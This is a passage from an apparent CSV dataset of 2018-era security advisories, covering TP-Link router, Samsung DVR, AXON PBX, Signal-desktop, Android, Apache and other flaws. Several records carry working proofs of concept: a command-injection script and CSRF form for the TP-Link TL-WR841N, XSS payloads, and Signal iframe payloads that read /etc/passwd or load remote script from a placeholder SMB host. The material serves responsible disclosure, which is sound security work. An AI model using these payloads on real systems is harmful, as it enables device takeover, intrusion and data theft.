$'[LAN_WLAN#0,0,0,0,0,0#0,0,0,0,0,0]0,19x0dx0anamex0dx0aSSIDx0dx0aEnablex0dx0aX_TP_Configuration_Modifiedx0dx0abeaconTypex0dx0aStandardx0dx0aWEPEncryptionLevelx0dx0aWEPKeyIndexx0dx0aBasicEncryptionModesx0dx0aBasicAuthenticationModex0dx0aWPAEncryptionModesx0dx0aWPAAuthenticationModex0dx0aIEEE11iEncryptionModesx0dx0aIEEE11iAuthenticationModex0dx0aX_TP_PreSharedKeyx0dx0aX_TP_GroupKeyUpdateIntervalx0dx0aX_TP_RadiusServerIPx0dx0aX_TP_RadiusServerPortx0dx0aX_TP_RadiusServerPasswordx0dx0a'
$'http://192.168.0.1/cgi?5'
Change Wifi password:
curl -i -s -k -X $'POST' -H $'Host: 192.168.0.1' -H $'Referer:
http://192.168.0.1/mainFrame.htm' -H $'Content-Length: 197' -H
$'Connection: close' --data-binary
$'[LAN_WLAN#1,1,0,0,0,0#0,0,0,0,0,0]0,5x0dx0aBeaconType=11ix0dx0aIEEE11iAuthenticationMode=PSKAuthenticationx0dx0aIEEE11iEncryptionModes=AESEncryptionx0dx0aX_TP_PreSharedKey=12345678x0dx0aX_TP_GroupKeyUpdateInterval=0x0dx0a'
$'http://192.168.0.1/cgi?2'
##### Solution
The issue was already fixed independently of this report in the newest
version of the firmware:
TL-WR841N(EU)_V13_180119:
https://www.tp-link.com/uk/download/TL-WR841N.html#Firmware
--
PGP Key: https://pgp.mit.edu/pks/lookup?op=get&search=0xFD8E2B9091A24C75"
1049,TP-Link TL-WR841N v13: Authenticated Blind Command Injection (CVE-2018-12577),,CVE-2018-12577,"* Vulnerability: Authenticated Blind Command Injection
* Affected Software: TP-Link TL-WR841N v13
* Affected Version: 0.9.1 4.16 v0001.0 Build 180119 Rel.65243n
* Patched Version: None
* Risk: High
* Vendor Contacted: 05/20/2018
* Vendor Fix: None
* Public Disclosure: 06/27/2018
##### Overview
The ping and traceroute functionalities allow for OS command injection.
An authenticated attacker can use this to execute arbitrary commands on
the router by sending specifically crafter HTTP requests to it.
##### CVSS
High 8.7 CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H
##### Details
The ping and traceroute functionalities accept user input and insert it
into a command without sanitation. An attacker can for example insert
further commands via a semicolon.
It should be noted that a user can already gain code execution by
uploading a custom firmware version. However, because of this
vulnerability, an attack could be performed by a remote attacker via a
CSRF issue in the same firmware version. Up until the previous firmware
version the attack could also be performed by an unauthenticated
attacker from the internal network because of a broken authentication issue.
##### POC
A successful attack requires the issuing of two POST requests. An attack
can for example be performed by intercepting the POST request to ""/cgi""
and changing ""host=127.0.0.1"" to ""host=127.0.0.1; reboot;""
The following script can be used to automate the process:
if [ ""$#"" -ne 3 ]; then
echo ""Usage: ./exec.sh 'user' 'pass' 'reboot'""
fi
USER=$1
PASS=$2
COMMAND=$3
AUTH=$(echo -ne ""$USER:$PASS"" | base64)
BINARY1=$'[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6x0dx0adataBlockSize=64x0dx0atimeout=1x0dx0anumberOfRepetitions=4x0dx0ahost=127.0.0.1;'
BINARY2=$';x0dx0aX_TP_ConnName=ewan_ipoe_dx0dx0adiagnosticsState=Requestedx0dx0a'
curl -i -s -k -X 'POST' 'http://192.168.0.1/cgi?2' -H 'Referer:
http://192.168.0.1/mainFrame.htm' -H ""Cookie: Authorization=Basic $AUTH""
--data-binary ""$BINARY1$COMMAND$BINARY2""
curl -i -s -k -X 'POST' 'http://192.168.0.1/cgi?7' -H 'Referer:
http://192.168.0.1/mainFrame.htm' -H ""Cookie: Authorization=Basic $AUTH""
--data-binary $'[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0x0dx0a'
##### Solution
The vendor did not fix the issue.
As an attack is only possible by an authenticated attacker or by
exploiting other vulnerabilities - such as CSRF issues or broken
authentication - users are advised to use secure passwords and to
mitigate against other vulnerabilities.
##### Timeline
- 05/20/2018 Requested email address via contact form (no response)
- 05/24/2018 Send advisory to security tp-link com asking for
confirmation, set disclosure date (no response)
- 06/01/2018 Asked for confirmation at support.usa tp-link com
- 06/04/2018 Vendor confirmed receipt of advisory
- 06/12/2018 Requested Status Update
- 06/14/2018 Vendor claims they never received advisory
- 06/14/2018 Resend advisory asking for confirmation (no response)
- 06/18/2018 Reminded vendor of disclosure date (no response)
- 06/18/2018 Requested CVE
- 06/19/2018 CVE assigned
- 06/27/2018 Disclosure
--
PGP Key: https://pgp.mit.edu/pks/lookup?op=get&search=0xFD8E2B9091A24C75"
1050,TP-Link TL-WR841N v13: CSRF (CVE-2018-12574),,CVE-2018-12574,"* Vulnerability: Cross-Site Request Forgery
* Affected Software: TP-Link TL-WR841N v13
* Affected Version: 0.9.1 4.16 v0001.0 Build 180119 Rel.65243n
* Patched Version: None
* Risk: High
* Vendor Contacted: 05/20/2018
* Vendor Fix: None
* Public Disclosure: 06/27/2018
##### Overview
The web interface of the router is vulnerable to CSRF. An attacker can
perform arbitrary actions in the name of an authenticated user if that
user visits an attacker-controlled website.
##### CVSS
High 8.8 CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
##### Details
The protection mechanism that is in place against CSRF checks if the
given ""referer"" header starts with ""192.168.0.1"". If it does, the
request is accepted.
An attacker can bypass this mechanism by prepending their domain with
this string. For example, the malicious HTML and JavaScript code could
be hosted at ""192.168.0.1.example.com"". Alternatively, an attack could
originate from a different IP in the internal network, eg ""192.168.0.11"".
##### Proof of Concept
Enable remote access:
<html>
<body>
<form action=""http://192.168.0.1/cgi?2&2"" method=""POST""
enctype=""text/plain"">
<input type=""hidden""
name=""&#91;HTTP&#95;CFG&#35;0&#44;0&#44;0&#44;0&#44;0&#44;0&#35;0&#44;0&#44;0&#44;0&#44;0&#44;0&#93;0&#44;2&#13;&#10;httpRemoteEnabled""
value=""1&#13;&#10;httpRemotePort&#61;7777&#13;&#10;&#91;APP&#95;CFG&#35;0&#44;0&#44;0&#44;0&#44;0&#44;0&#35;0&#44;0&#44;0&#44;0&#44;0&#44;0&#93;1&#44;1&#13;&#10;remoteHost&#61;255&#46;255&#46;255&#46;255&#13;&#10;""
/>
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
The code would be hosted at a subdomain which starts with ""192.168.0.1"",
eg ""192.168.0.1.example.com"".
##### Request
POST /cgi?2&2 HTTP/1.1
Host: 192.168.0.1
User-Agent: [...]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.1.example.com/csrf.html
Content-Type: text/plain
Content-Length: 147
Cookie: Authorization=Basic [...]
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
[HTTP_CFG#0,0,0,0,0,0#0,0,0,0,0,0]0,2
httpRemoteEnabled=1
httpRemotePort=7777
[APP_CFG#0,0,0,0,0,0#0,0,0,0,0,0]1,1
remoteHost=255.255.255.255
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 8
[error]0
##### Solution
The vendor did not fix the issue.
Users of the product can try to mitigate the issue by not visiting other
websites while being signed into the web interface and signing out as
soon as possible. Additionally, various browser plugins can be used to
try to defend against attacks.
##### Timeline
- 05/20/2018 Requested email address via contact form (no response)
- 05/24/2018 Send advisory to security tp-link com asking for
confirmation, set disclosure date (no response)
- 06/01/2018 Asked for confirmation at support.usa tp-link com
- 06/04/2018 Vendor confirmed receipt of advisory
- 06/12/2018 Requested Status Update
- 06/14/2018 Vendor claims they never received advisory
- 06/14/2018 Resend advisory asking for confirmation (no response)
- 06/18/2018 Reminded vendor of disclosure date (no response)
- 06/18/2018 Requested CVE
- 06/19/2018 CVE assigned
- 06/27/2018 Disclosure
--
PGP Key: https://pgp.mit.edu/pks/lookup?op=get&search=0xFD8E2B9091A24C75"
1071,Samsung Web Viewer for Samsung DVR Reflected Cross Site Scripting (XSS) CVE-2018-11689,,CVE-2018-11689,"I. VULNERABILITY
-------------------------
Samsung Web Viewer for Samsung DVR Reflected Cross Site Scripting (XSS)
II. CVE REFERENCE
-------------------------
CVE-2018-11689
III. REFERENCES
-------------------------
https://vulmon.com/vulnerabilitydetails?qid=CVE-2018-11689
IV. CREDIT
-------------------------
Yavuz Atlas - Biznet Bilisim
http://www.biznet.com.tr/biznet-guvenlik-duyurulari
V. DESCRIPTION
-------------------------
Samsung Web Viewer for Samsung DVR devices (Samsung Smart Viewer) is
vulnerable to cross-site scripting. The vulnerability allows remote
attackers to inject arbitrary web script or HTML.
VI. PROOF OF CONCEPT
-------------------------
Request:
GET /cgi-bin/webviewer_login_page?lang=tu&loginvalue=0&port=0&data3=</script><script>alert(1)</script>
HTTP/1.1
Host: 10.10.10.10
Response:
HTTP/1.1 200 OK
X-UA-Compatible: IE=EmulateIE9, requiresActiveX=true
Content-type: text/html
Connection: close
Date: Wed, 23 May 2018 11:14:09 GMT
Server: lighttpd/1.4.35
Content-Length: 10797
…
function setcookie(){
var val_rand = Math.random();
if(is_close_user_session == true)
document.login_page_submit.close_user_session.value = 1;
else
document.login_page_submit.close_user_session.value = 0;
document.login_page_submit.data1.value =
data_parser(document.login_page.data1.value);
document.login_page_submit.data2.value =
do_encrypt(document.login_page.data2.value);
document.login_page_submit.data3.value = </script><script>alert(1)</script>;
document.login_page_submit.data4.value = val_rand;
document.login_page_submit.submit();
}
…"
1104,CVE-2018-11552 AXON PBX 2.02 Cross Site Scripting Vulnerability,,CVE-2018-11552,"Aloha,
*1. Introduction*
Vendor: NCH Software
Affected Product: AXON PBX - 2.02
Vendor Website: http://www.nch.com.au/pbx/index.html
Vulnerability Type: Reflected XSS
Remote Exploitable: Yes
CVE: CVE-2018-11552
*2. Overview*
There is a reflected XSS vulnerability in AXON PBX Web interface. The
vulnerability exists due to insufficient filtration of user-supplied data.
A remote attacker can execute arbitrary HTML and script code in browser in
context of the vulnerable application.
*3. Affected Parameter*
'Name' Parameter (Go to AXON->Auto-Dialer->Agents->Name)
*4. Payload*
<script>alert('XSS')</script>
*5. Credit*
Himanshu Mehta (@LionHeartRoxx)
Chao,
Himanshu Mehta"
1107,Android OS Didnt use FLAG_SECURE for Sensitive Settings [CVE-2017-13243],,CVE-2017-13243,"[Blog post here:
https://wwws.nightwatchcybersecurity.com/2018/05/24/android-os-didnt-use-flag_secure-for-sensitive-settings-cve-2017-13243/]
SUMMARY
Android OS did not use the FLAG_SECURE flag for sensitive settings,
potentially exposing sensitive data to other applications on the same
device with the screen capture permissions. The vendor (Google) fixed
this issue in 2018-02-01 Pixel security update. Google has assigned
CVE-2017-13243 to track this issue.
DETAILS
Android OS is a mobile operating systems for phones and tablets
developed by Google. The OS has multiple screens where sensitive
information maybe shown such as the device lock screen, passwords in
the WiFi settings, pairing codes for Bluetooth, etc.
FLAG_SECURE is a special flag available to Android developers that
prevents a particular screen within an application from being seen by
other application with screen capture permissions, having screenshots
taken by the user, or have the screen captured in the �Recent Apps�
portion of Android OS. We have published an extensive post last year
discussing this feature is and what it does:
https://wwws.nightwatchcybersecurity.com/2016/04/13/research-securing-android-applications-from-screen-capture/
During our testing of various Google mobile applications, we found
that the lock screen, password entry screen for WiFi, and the screen
for entering pairing codes for Bluetooth devices did not use
FLAG_SECURE to prevent other applications for capturing that
information. By contrast other Google applications like Android Pay
and Google Wallet use this flag to prevent capture of sensitive
information. Exploiting this bug requires user cooperation in
installing a malicious app and activating the actual screen capture
process, thus the likelihood of exploitation is low.
To reproduce:
1. Lock the device, OR go to WiFi settings and try to add a network,
or try to pair a Bluetooth device.
2. Press Power and volume down to capture screenshot.
3. Confirm that a screenshot can be taken.
All testing was done on Android 7.1.2, security patch level of May
5th, 2017, on Nexus 6P. Vulnerable versions of Android include: 5.1.1,
6.0, 6.0.1, 7.0, 7.1.1, 7.1.2 and 8.0.
VENDOR RESPONSE
This issue was responsibly reported to the vendor and was fixed in the
2018-02-01 Pixel bulletin. The vendor assigned CVE-2017-13243 to track
this issue.
BOUNTY INFORMATION
This issue satisfied the requirements of the Android Security Rewards
program and a bounty was paid.
REFERENCES
Android ID # A-38258991
CVE ID: CVE-2017-13243
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-13243
CVSS scores: 7.5 (CVSS v3.0) / 5.0 (CVSS v2.0)
Google Bug # 38254822
Google Pixel Bulletin: 2018-02-1
https://source.android.com/security/bulletin/pixel/2018-02-01
CREDITS
Advisory written by Yakov Shafranovich.
TIMELINE
2017-05-12: Initial report to the vendor
2017-06-15: Follow-up information sent to the vendor
2017-06-19: Follow-up communication with the vendor
2018-01-02: Vendor communicates plan to patch this issue
2018-01-29: Bounty reward issued
2018-02-01: Vendor publishes a patch for this issue
2018-05-24: Public disclosure / advisory published"
1108,PHP Login & User Management <= 4.1.0 - Arbitrary File Upload (CVE-2018-11392),,CVE-2018-11392,"[Title]
PHP Login & User Management <= 4.1.0 - Arbitrary File Upload (CVE-2018-11392)
[Product]
PHP Login & User Management
https://codecanyon.net/item/php-login-user-management/49008
[CVE]
CVE-2018-11392
[Credit]
Reginald Dodd
[Description]
An arbitrary file upload vulnerability in /classes/profile.class.php in Jigowatt ""PHP Login & User Management"" before 4.1.1, as distributed in the Envato Market, allows any remote authenticated user to upload .php files to the web server via a profile avatar field. This results in arbitrary code execution by requesting the .php file.
[Affected Versions]
v4.1.0 and below
[Solution]
Upgrade to v4.1.1
[Timeline]
April 28, 2018 - A detailed vulnerability report was sent to the vendor.
May 1, 2018 - The vendor acknowledged the report.
May 15, 2018 - The developer made the fix available through the vendor's marketplace.
May 22, 2018 - I requested an update, and the vendor stated that this issue has been ""resolved"".
May 22, 2018 - Mitre assigned a CVE."
1110,[CVE-2018-8013] Apache Batik information disclosure vulnerability,,CVE-2018-8013,"CVE-2018-8013:
Apache Batik information disclosure vulnerability
Severity:
Medium
Vendor:
The Apache Software Foundation
Versions Affected:
Batik 1.0 - 1.9.1
Description:
When deserializing subclass of `AbstractDocument`, the class takes a
string from the inputStream as the class name which then use it to call the
no-arg constructor of the class.
Fix was to check the class type before calling newInstance in
deserialization.
Mitigation:
Users should upgrade to Batik 1.10+
Credit:
This issue was independently reported by Man Yue Mo.
References:
http://xmlgraphics.apache.org/security.html
The Apache XML Graphics team."
1122,MagniComp SysInfo Information Exposure [CVE-2018-7268],,CVE-2018-7268,"MagniComp SysInfo Information Exposure [CVE-2018-7268]
======================================================
The latest version of this advisory is available at:
https://sintonen.fi/advisories/magnicomp-sysinfo-information-exposure.txt
Overview
--------
MagniComp SysInfo contains a information exposure vulnerability through debug
functionality.
Description
-----------
Due to a combination of setuid binary and verbose debugging, MagniComp SysInfo can be
used to read any file on the system owned by root (uid 0).
Impact
------
A local unprivileged user is able to read any root (uid 0) owned file on the system,
regardless of the file permissions. Confidential information such as password hashes
(/etc/shadow) or other secrets (such as log files, private keys) can be leaked to
the attacker. The vulnerability has a confidentiality impact, but has no direct impact
on system integrity or availability.
Details
-------
[Full details of the vulnerability will be released on 2018.06.18.]
Vulnerabilities
---------------
[Full details of the vulnerability will be released on 2018.06.18.]
Vulnerable versions
-------------------
The following SysInfo versions are confirmed vulnerable:
- Linux/Unix/Mac SysInfo versions up and including 10.0 (H80)
Notably MagniComp SysInfo is bundled with the BMC BladeLogic Automation product. With
BMC BladeLogic installations the tool can be found from the following location:
/opt/bmc/bladelogic/RSCD/nativetool/bin
Mitigation
----------
1. Upgrade to SysInfo 10-H81 or later
Similar or prior work
---------------------
1. Unrelated earlier privilege escalation vulnerability CVE-2017-6516 -
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6516
Credits
-------
The vulnerability was discovered by Harry Sintonen / F-Secure Corporation.
Timeline
--------
2018.02.13 discovered the vulnerability
2018.02.14 wrote a preliminary advisory
2018.02.14 contacted MagniComp at info magnicomp com requesting security contact
2018.02.14 sent vulnerability details to CERT-FI vulncoord
2018.02.15 sent vulnerability details to MagniComp security contact
2018.02.16 MagniComp acknowledged the vulnerability
2018.02.20 requested CVE ID from MITRE
2018.02.21 CVE-2018-7268 assigned by MITRE
2018.02.22 MagniComp released SysInfo 10-H81 fixing the vulnerability. however,
due to extensive OEM bundling the embargo is extended
2018.05.18 public disclosure of the redacted advisory"
1127,CVE-2018-11101: Signal-desktop HTML tag injection variant 2,,CVE-2018-11101,"Title: Signal-desktop HTML tag injection variant 2
Date Published: 2018-05-16
Last Update: 2018-05-16
CVE Name: CVE-2018-11101
Class: Code injection
Remotely Exploitable: Yes
Locally Exploitable: No
Vendors contacted: Signal.org
Vulnerability Description:
Signal-desktop is the standalone desktop version of the secure
Signal messenger. This software is vulnerable to remote code execution
from a malicious contact, by sending a specially crafted message
containing HTML code that is injected into the chat windows (Cross-site
scripting). This is a new variant of CVE-2018-10994.
Vulnerable Packages:
Signal-desktop messenger v1.7.1
Signal-desktop messenger v1.8.0
Signal-desktop messenger v1.9.0
Signal-desktop messenger v1.10.0
Signal-desktop messenger v1.10.1
Solution/Vendor Information/Workaround:
Do not trust user input. Sanitize it by encoding HTML tags or
filtering them. Also, a CSP header is missing, that would deter the
action of iframes. Include “frame-src ‘none'” or, if required,
“frame-src ‘self'” in the CSP declaration.
For final users: Upgrade to signal-desktop messenger v1.11
Credits:
This vulnerability was found and researched by Barrera Oro, Iván Ariel
(@HacKanCuBa), Bryant, Matt (@IAmMandatory), Ortega, Alfredo
(@ortegaalfredo) and Rizzo, Juliano (@julianor).
Technical Description – Exploit/Concept Code
After publishing CVE-2018-10994, Matt discovered that the vulnerability
prevailed but the attack was a bit different: the attacker needs to send
HTML code directly as a message, and then reply to that message to
trigger this vulnerability. The Signal-desktop software fails to
sanitize specific HTML tags that can be used to inject HTML code into
remote chat windows when replying to a HTML message. Specifically the
<img> and <iframe> tags can be used to include remote or local
resources. For example, the use of iframes enables full code
execution, allowing an attacker to download/upload files, information,
etc. The <script> tag was also found injectable. In the Windows
operative system, the CSP fails to prevent remote inclusion of resources
via the SMB protocol. In this case, remote execution of JavaScript can
be achieved by referencing the script in a SMB share as the source of an
iframe tag, for example: <iframe src=\DESKTOP-XXXXXTemp est.html> and
then replying to it. The included JavaScript code is then executed
automatically, without any interaction needed from the user. The
vulnerability can be triggered in the Signal-Desktop client by sending a
specially crafted message and then replying to it with any text or
content in the reply (it doesn’t matter). Examples:
Show an iframe with some text:
<iframe srcdoc=""<p>PWONED!!</p>""></iframe>
Display content of user’s own /etc/passwd file:
<iframe src=""/etc/passwd""></iframe>
Include and auto-execute a remote JavaScript file (for Windows clients):
<iframe src=""\XXX.XXX.XXX.XXXTemp est.html""></iframe>
Show a displacing base64-encoded image (bypass “click to download image”):
<marquee><img
src=""data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDACgcHiMeGSgjISMtKygwPGRBPDc3PHtYXUlkkYCZlo+AjIqgtObDoKrarYqMyP/L2u71////m8H////6/+b9//j/wAALCAAtADwBAREA/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/9oACAEBAAA/AMapRbv5YckKD0z1pPJbjJAzSGIgjcQMnFEkZSTZkE+1STWksTKrAZbpThYzfLuAUN3JFJ9kkyeV4PrTBFyNzCpSGuZiRgY4ArRgtAvzSfMfSqN3EYpjsA2noTg1B87HlqNrnqxP40nlt6ml8pvWo/MY/wARqzAzcEVorK24RuAAw4IqLUo2EKFFJIOM9azN8oOMkfhTz9oVdxDhfWlR3ZOWJ/Gpdzep/OqVTQEq2MVpo4aNWABKHnNLIzNHGW7OST6DFZ92wEoAGAvX3qNrl/KaEH5CePaliPyYqVTwKrIu41O1u0Z4BP06irUDKiky5DYx04p8sxddpwFA6etZcrFnJPepLa2NwSFPIoQbQVPUHFTLjFUskd6d5j/3m/Ok3sf4j+dG9j/EfzpKVXZPusR9DSZPrS7j6mv/2Q==""/></marquee>
Timeline:
2018-05-14 19:00 GMT-3: vuln discovered
2018-05-14 20:00 GMT-3: emailed Signal security team
2018-05-14 20:21 GMT-3: reply from Signal: vuln confirmed & patch ongoing
2018-05-14 21:47 GMT-3: signal-desktop update published
2018-05-16 11:00 GMT-3: public disclosure
References:
Patch:
https://github.com/signalapp/Signal-Desktop/compare/v1.11.0-beta.2…development
CVE-2018-11101 write-ups:
https://ivan.barreraoro.com.ar/signal-desktop-html-tag-injection-variant-2/
https://thehackerblog.com/i-too-like-to-live-dangerously-accidentally-finding-rce-in-signal-desktop-via-html-injection-in-quoted-replies/
CVE-2018-10994 write-up:
https://ivan.barreraoro.com.ar/signal-desktop-html-tag-injection/"
1133,CVE-2018-10994: HTML tag injection in Signal-desktop,,CVE-2018-10994,"Title: HTML tag injection in Signal-desktop
Date Published: 14-05-2018
CVE Name: CVE-2018-10994
Class: Code injection
Remotely Exploitable: Yes
Locally Exploitable: No
Vendors contacted: Signal.org
Vulnerability Description:
Signal-desktop is the standalone desktop version of the secure Signal
messenger.
This software is vulnerable to remote code execution from a malicious
contact,
by sending a specially crafted message containing HTML code that is
injected
into the chat windows (Cross-site scripting).
Vulnerable Packages:
Signal-desktop messenger v1.7.1
Signal-desktop messenger v1.8.0
Signal-desktop messenger v1.9.0
Signal-desktop messenger v1.10.0
Solution/Vendor Information/Workaround
Upgrade to Signal-desktop messenger v1.10.1, v1.11.0-beta.3.
Credits:
This vulnerability was found and researched by:
Iván Ariel Barrera Oro (@HacKanCuBa), Alfredo Ortega (@ortegaalfredo) and
Juliano Rizzo (@julianor), with assistance from
Javier Lorenzo Carlos Smaldone (@mis2centavos).
Technical Description - Exploit/Concept Code
12345678901234567890123456789012345678901234567890123456789012345678901234567890
While discussing a XSS vulnerability on a website using the Signal-desktop
messenger, it was found that the messenger software also displayed a
code-injection vulnerability while parsing the affected URLs.
The Signal-desktop software fails to sanitize specific html-encoded HTML
tags
that can be used to inject HTML code into remote chat windows.
Specifically the <img> and <iframe> tags can be used to include remote
or local
resources. For example, the use of iframes enables full code execution,
allowing
an attacker to download/upload files, information, etc. The <script>
tag was
also found injectable.
In the Windows operative system, the CSP fails to prevent remote
inclusion of
resources via the SMB protocol. In this case, remote execution of
JavaScript can
be achieved by referencing the script in a SMB share as the source of an
iframe tag, for example: <iframe src=\DESKTOP-XXXXXTemp est.html>.
The included javascript code is then executed automatically, without any
interaction needed from the user. The vulnerability can be triggered in the
Signal-Desktop client by sending a specially crafted message. Example
messages:
Show an iframe with some text:
PWONED!!
""%3E%3C/iframe%3E"">http://hacktheplanet/?p=%3Ciframe%20srcdoc=""
PWONED!!
""%3E%3C/iframe%3E
Show a base64-encoded image (bypass ""click to download image""):
http://hacktheplanet/?p=%3Cimg%20src=""data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDACgcHiMeGSgjISMtKygwPGRBPDc3PHtYXUlkkYCZlo+AjIqgtObDoKrarYqMyP/L2u71////m8H////6/+b9//j/wAALCAAtADwBAREA/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/9oACAEBAAA/AMapRbv5YckKD0z1pPJbjJAzSGIgjcQMnFEkZSTZkE+1STWksTKrAZbpThYzfLuAUN3JFJ9kkyeV4PrTBFyNzCpSGuZiRgY4ArRgtAvzSfMfSqN3EYpjsA2noTg1B87HlqNrnqxP40nlt6ml8pvWo/MY/wARqzAzcEVorK24RuAAw4IqLUo2EKFFJIOM9azN8oOMkfhTz9oVdxDhfWlR3ZOWJ/Gpdzep/OqVTQEq2MVpo4aNWABKHnNLIzNHGW7OST6DFZ92wEoAGAvX3qNrl/KaEH5CePaliPyYqVTwKrIu41O1u0Z4BP06irUDKiky5DYx04p8sxddpwFA6etZcrFnJPepLa2NwSFPIoQbQVPUHFTLjFUskd6d5j/3m/Ok3sf4j+dG9j/EfzpKVXZPusR9DSZPrS7j6mv/2Q==""%3e
Include and auto-execute a remote JavaScript file (for Windows
clients):
http://hacktheplanet/?p=%3d%3Ciframe%20src=\XXX.XXX.XXX.XXXTemp est.html%3E
Timeline:
* 2018-05-10 18:45 GMT-3: vuln discovered
* 2018-05-11 13:03 GMT-3: emailed Signal security team
* 2018-05-11 15:02 GMT-3: reply from Signal: vuln confirmed & patch
ongoing
* 2018-05-11 16:12 GMT-3: patch committed
* 2018-05-11 18:00 GMT-3: signal-desktop update published
* 2018-05-14 18:00 GMT-3: public disclosure
References:
* Patch:
https://github.com/signalapp/Signal-Desktop/compare/v1.11.0-beta.2...v1.11.0-beta.3
* Writeup:
https://ivan.barreraoro.com.ar/signal-desktop-html-tag-injection/"
1171,CVE-2016-6811: Apache Hadoop Privilege escalation vulnerability,,CVE-2016-6811,"CVE-2016-6811: Apache Hadoop Privilege escalation vulnerability
Severity: Critical
Vendor: The Apache Software Foundation
Versions Affected:
All the Apache Hadoop versions from 2.2.0 to 2.7.3
Description:
A user who can escalate to yarn user can possibly run arbitrary commands as root user.
Mitigation:
Users should upgrade to 2.7.4 or upper.
If you are using the affected version of Apache Hadoop and there are
any users who can escalate to yarn user and cannot escalate to root user,
remove the permission to escalate to yarn user from them.
Credit:
This issue was discovered by Freddie Rice."
1268,RedCoded ISR: Abine Blur Password Manager Insecure Permissions (CVE-2018-8213),,CVE-2018-8213,"Abine Blur Password Manager Insecure Permissions
Module: Blur Web Extension
Announced: 2018-03-10/16
Credits: RS Tyler Schroder
Affects: 7.8.242* BEFORE 7.8.2428
CVE ID: CVE-2018-7213
I. Background
Abine Blur is a password management suite combined with online anonymity
tools designed to help consumers remain anonymous in the digital era.
https://abine.com
II. Problem Description
The Password Manager Extension in Abine Blur 7.8.242* before 7.8.2428 allows
attackers to bypass the Multi-Factor Authentication and macOS
disk-encryption protection mechanisms, and consequently exfiltrate secured
data, because the right-click context menu is not secured.
II.I Technical
Abine Blur 7.8.242* failed to secure the right-click context menu, allowing
an attacker with either physical access or remote-desktop access to disclose
passwords, emails, and usernames of the victim without triggering a
second-factor request.
III. Impact
Access to secured data can lead to secure information exfiltration, a 2FA
bypass, and a further undisclosed MacOS(x) disk encryption console bypass
(to access secured Abine Blur data).
IV. Workaround
No workaround, as the vendor has issued a patch.
V. Solution
Update your browser plug-in per your browser vendor's instructions. Firefox
5x.xx and Chrome 63.x are known to automatically update to the latest
version.
VI. Timeline of Events
* 2018-02-13: Discovery of Vulnerability
* 2018-02-13: Vendor Contacted
* 2018-02-14: CERT/CC activated for vendor PGP coordination
* 2018-02-14: Vendor responds (PGP)
* 2018-02-15: CERT/CC [VU#714299] unable to assist further
* 2018-02-16: MITRE Contacted for CVE
* 2018-02-17: MITRE Confirms & Issues CVE (CVE-2018-7213)
* 2018-02-28: Patch Issued
* 2018-03-10: Public Disclosure.
Further Details: https://redcoded.com/2018/CVE/ |
https://addons.mozilla.org/en-US/firefox/addon/donottrackplus/versions/?page
=1#version-7.8.2428
-----BEGIN PGP MESSAGE-----
Version: GnuPG v2
owF9VXtwE0UYb9EixJbXiPXBY6EKFJqEhNLSgFNKH0yU0tKWgjBFL3ebZCd3t/Fu
jzSoA86oPHVA6SBiHaDKWCgwQp3CH4Igan2gKIpAh+koIkJFRS2vGajf3iWh0Rn/
aLp7+z1+3+/77bdrM+5I6Ze69CH3c5saR2Slfn7Rl7KgpSS/yEdUjGbIhoYqBV2P
UE1C5YIqBLCGvKqORUPDqBJrCtF1QlU9w1ZOJUPGHstnHvah0nqGVX6YYStSVWqo
IpY8yD3RNcU+cZLdNdHpysuwFWtYIkz3oKpqVBOVIXq1GNSohDXw8vuxyM/yHVMc
7lz3eDSjtKyiqjS+nwLutaXIW+JB8N9uRs53uyZl2DJsXgeaIYihgAZ5JQh1uxyi
IwGF4zUpZk0KVhnSDcIwEqnCbSUUISyIqCpzR0GlalQhLIoYpbKOJKyTADdiFAWx
HAYvVTcUrOlIw4pA1JgHNXQEGxbESCIBwgQZYU1woCBjYd3jdAo8lQNSmpABc6VG
fTJWUAnWRY2Emclehq0GAvynDQl+eYpeBSbY8mE/hS7F2UKCLNMIVM8YMMOxAnpf
lFNhIiw3ZEbsZYLIqIaKDPikMiIKHAOUw6kSK6qhDj1kx6qoRU10KKxRBl3iSwWL
QUEluqLnmA6cFPyUAWHkKML1fiIzTQCKLfVISBKYkAMoRcHQsQlBI4Egs4syEUPc
m+F6BlFVgzdNpSzu6YjR5UU1kFIFkHJSixMM+AUiW12KKfb/kuRYBBE1AOgTLFk6
wPAD63AwqvNsSBBFDLQBUdBvIMAOiggxGo4fQEYgSpQpFBbXGrDCtSHH2IGaNVVQ
METxm7gWE6BRMfNRgyEGOKHNJhwOn6qS3W81R+Os6ixGA8jGq4ThBDhIZO/NMRKh
HhkLvYkgKmhDsZqbaA1sctAFAbnLimLCsKAKyG9oJgFwmWJlcR2CHsbVZ5uSQL0k
